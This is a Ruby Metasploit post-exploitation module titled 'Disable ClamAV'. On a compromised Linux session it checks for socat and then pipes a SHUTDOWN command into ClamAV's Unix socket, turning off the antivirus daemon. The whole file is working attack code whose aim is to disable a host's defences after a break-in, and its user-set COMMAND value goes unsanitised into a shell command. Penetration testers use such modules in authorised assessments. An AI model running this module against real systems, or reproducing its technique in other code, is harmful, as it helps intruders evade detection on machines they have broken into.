##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = ExcellentRanking
  include Msf::Post::File
  include Msf::Post::Unix


  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Disable ClamAV',
        'Description' => %q{
          This module will write to the ClamAV Unix socket to shutoff ClamAV.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'DLL_Cool_J'
        ],
        'Platform' => [ 'linux' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
      )
    )
    register_options(
      [
        OptString.new("CLAMAV_UNIX_SOCKET", [true, "ClamAV unix socket", "/run/clamav/clamd.ctl" ]),
        OptString.new("COMMAND", [true, "ClamAV command to execute", "SHUTDOWN" ])
      ], self.class
    )
  end


 def run
    clamav_socket = datastore['CLAMAV_UNIX_SOCKET']
		cmd = datastore['COMMAND']

    if command_exists?("socat")
      print_good("socat exists") 
    else
      print_bad("socat does not exist on target host. Quitting!")
      return
    end

    print_status("Checking file path #{clamav_socket} exists and is writable... ")
		if writable?("#{clamav_socket}")
			print_good("File does exist and is writable!")
			print_good("Sending #{cmd}...")
      cmd_exec("echo #{cmd} | socat - UNIX-CONNECT:#{clamav_socket}")
    else
			print_bad("File does NOT exist or is not writable!")
	 end
  end
end
